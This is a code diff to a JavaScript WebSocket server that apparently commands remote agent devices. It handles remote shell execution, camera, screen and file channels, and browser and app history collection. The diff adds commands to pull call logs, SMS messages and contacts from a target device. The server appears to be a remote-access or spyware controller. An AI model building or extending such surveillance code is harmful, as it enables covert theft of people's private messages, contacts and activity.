@@ -337,19 +337,14 @@ function getShellResponsePayload(packet) {
 }
 
 function isShellResponsePacket(packet) {
-    const shellPayload = getShellResponsePayload(packet);
-    return Boolean(
-        packet && (
-            packet.type === 'shell_output' ||
-            packet.type === 'sys_error' ||
-            (packet.type === 'sys_ack' && (
-                shellPayload ||
-                packet.action === 'SHELL_EXECUTE' ||
-                packet.action === 'SHELL_EXECUTE_RAW' ||
-                typeof packet.message === 'string'
-            ))
-        )
-    );
+    if (!packet || typeof packet !== 'object') return false;
+    if (packet.channel === 'files' || packet.channel === 'camera' || packet.channel === 'screen') return false;
+    if (packet.file_result) return false;
+    if (packet.hardware_metrics) return false;
+    if (packet.type === 'shell_output') return true;
+    if (packet.shell && typeof packet.shell === 'object') return true;
+    const action = String(packet.action || packet.last_action || '');
+    return action === 'SHELL_EXECUTE' || action === 'SHELL_EXECUTE_RAW';
 }
 
 function toBuffer(message) {
@@ -926,6 +921,9 @@ async function handleSocketMessage(ws, message) {
                     'FETCH_BROWSER_HISTORY_DELTA',
                     'FETCH_APP_HISTORY',
                     'FETCH_SYSTEM_NOTIFICATIONS',
+                    'FETCH_CALL_LOGS',
+                    'FETCH_SMS_MESSAGES',
+                    'FETCH_CONTACTS',
                     'STOP_HISTORY_COLLECTION',
                 ]);
                 if (lightActions.has(action) && sendCommandToAgent(packet.targetDeviceId, action, packet.payload || {})) {
@@ -1091,8 +1089,10 @@ function persistHardwareMetrics(ws, packet, activeConnections) {
     const storage = typeof metrics.storage === 'number' ? metrics.storage : (typeof metrics.storage_percent === 'number' ? metrics.storage_percent : null);
     const localIp = String(metrics.local_ip || metrics.localIp || packet.localIp || packet.local_ip || '');
     const publicIp = String(metrics.public_ip || metrics.publicIp || packet.publicIp || packet.public_ip || '');
-    const platform = String(packet.platform || metrics.platform || 'unknown');
-    const status = String(packet.status || 'online');
+    const platformRaw = String(packet.platform || metrics.platform || '');
+    const platform = platformRaw && platformRaw !== 'unknown' ? platformRaw : undefined;
+    const rawStatus = String(packet.status || 'online').toLowerCase();
+    const status = ['online', 'offline', 'away', 'idle'].includes(rawStatus) ? rawStatus : 'online';
     const lastSeen = packet.timestamp ? new Date(Number(packet.timestamp) * 1000) : new Date();
 
     const update = {
@@ -1100,10 +1100,10 @@ function persistHardwareMetrics(ws, packet, activeConnections) {
         storage,
         localIp,
         publicIp,
-        platform,
         status,
         lastSeen,
     };
+    if (platform) update.platform = platform;
     if (ownerUserId) update.userId = ownerUserId;
 
     // Queue Mongo write — never await on the WS hot path.
